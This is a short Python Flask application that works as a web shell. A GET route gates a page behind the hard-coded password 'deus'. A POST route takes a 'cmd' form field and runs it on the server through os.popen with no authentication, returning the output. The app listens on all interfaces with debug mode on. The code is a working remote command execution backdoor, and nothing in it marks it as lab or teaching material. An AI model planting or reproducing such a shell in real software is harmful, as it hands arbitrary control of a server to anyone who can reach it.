from flask import Flask, render_template, request
import os

app = Flask(__name__)

@app.route('/')
def index():
	id = request.args.get('id')
	
	if id == 'deus':
		return render_template('index.html')
	else:
		return "Access Failed."

@app.route('/', methods=['POST'] )
def cmd():
	cmd = request.form['cmd']

	result = os.popen(cmd).read()

	return render_template('index.html', cmd=result)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port='8080', debug=True)